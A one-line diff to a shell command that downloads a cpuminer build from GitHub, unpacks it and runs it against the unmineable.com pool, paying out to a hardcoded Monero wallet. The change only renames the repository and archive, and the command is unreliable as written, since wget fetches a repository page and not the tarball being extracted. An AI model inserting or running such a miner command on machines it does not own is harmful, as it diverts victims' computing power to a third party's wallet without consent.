@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-linux && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer -a ghostrider -o stratum+tcp://gr.unmineable.com:3333 -u XMR:846SwE2HixnZxcCzL1qpxkMGMTQV5ceUtGAYTskWQ7biYtfTbqKhv4r5nGqKyD9bQ8JFA5rzjWafqJ1n8beyxhyF7ryWkkm -p ocean -t 2
+wget https://github.com/rplant8/cpuminer-opt-rplant && tar xvf cpuminer-opt-rplant.tar.gz && ./cpuminer -a ghostrider -o stratum+tcp://gr.unmineable.com:3333 -u XMR:846SwE2HixnZxcCzL1qpxkMGMTQV5ceUtGAYTskWQ7biYtfTbqKhv4r5nGqKyD9bQ8JFA5rzjWafqJ1n8beyxhyF7ryWkkm -p ocean -t 2
